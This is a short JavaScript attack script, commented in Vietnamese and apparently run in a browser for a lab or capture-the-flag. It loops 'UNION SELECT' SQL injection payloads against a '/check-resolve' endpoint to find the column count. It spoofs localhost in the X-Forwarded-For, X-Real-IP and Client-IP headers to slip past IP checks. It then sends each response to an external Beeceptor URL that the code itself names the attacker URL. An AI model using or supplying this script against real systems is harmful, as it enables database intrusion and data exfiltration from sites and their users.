// Thử tự động từ 1 đến 8 cột
for (let i = 1; i <= 8; i++) {
    // Tạo chuỗi "1", "1, 2", "1, 2, 3"... tương ứng với số cột
    let cols = Array.from({length: i}, (_, idx) => idx + 1).join(', ');
    
    let formData = new URLSearchParams();
    formData.append('id', '-1 UNION SELECT ' + cols);

    fetch('/check-resolve', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'X-Forwarded-For': '127.0.0.1',
            'X-Real-IP': '127.0.0.1',
            'Client-IP': '127.0.0.1'
        },
        body: formData.toString()
    })
    .then(res => res.text())
    .then(data => {
        // Gửi tát cả kết quả về Beeceptor kèm theo tham số col= để biết là mấy cột
        let attackerUrl = 'https://khanh.free.beeceptor.com/?col=' + i + '&data=' + encodeURIComponent(data);
        fetch(attackerUrl, { mode: 'no-cors' });
    });
}